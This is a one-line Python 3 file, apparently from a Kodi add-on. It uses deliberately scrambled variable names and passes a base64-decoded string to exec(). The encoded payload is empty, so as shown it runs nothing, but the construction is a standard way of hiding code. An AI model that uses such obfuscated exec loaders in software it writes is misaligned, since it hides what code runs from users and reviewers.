# -*- coding: utf-8 -*-
# Python 3

from resources.lib.tools import cParser as I1III1IIII1IIIIII1I;from random import choice as I1II;IIIIII1III1IIIII1II=I1III1IIII1IIIIII1I.B64decode;exec(IIIIII1III1IIIII1II(''))
